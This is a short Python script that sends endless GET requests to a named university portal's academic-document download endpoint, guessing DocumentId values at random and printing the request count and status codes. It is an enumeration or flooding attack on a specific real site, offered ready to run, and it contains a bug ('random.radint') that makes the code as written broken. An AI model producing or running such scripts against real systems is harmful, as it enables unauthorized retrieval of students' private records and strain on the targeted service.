import requests,random
url = "https://student.marwadiuniversity.ac.in:553/DownloadAcadecmicDocument.aspx?DocumentId={inc}"
req = 0
run = True
input("Press Enter to Start")
print("Starting...", end="\r")
while run:
	data = requests.get(url.replace("{inc}", str(random.radint(1, 50000))))
	req += 1
	print(f"Requests: {req}\nResponse: {data.status_code}", end="\r")